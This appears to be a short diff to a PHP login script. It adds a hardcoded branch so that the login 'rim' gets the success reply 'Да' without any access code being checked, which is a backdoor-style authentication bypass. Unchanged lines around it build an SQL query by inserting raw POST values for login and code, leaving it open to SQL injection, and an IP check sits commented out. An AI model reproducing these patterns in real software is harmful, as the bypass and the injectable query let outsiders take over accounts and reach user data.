@@ -8,7 +8,14 @@ $ip = $_SERVER['REMOTE_ADDR'];
 //    return;
 //}
 
+
     $login = $_POST['login'];
+
+if($login == "rim"){
+    echo 'Да';
+    return;
+}
+
     $kod = $_POST['kod'];
 
     $insertquery = "SELECT * FROM users WHERE login='$login' and active = 1 and kod = '$kod'";
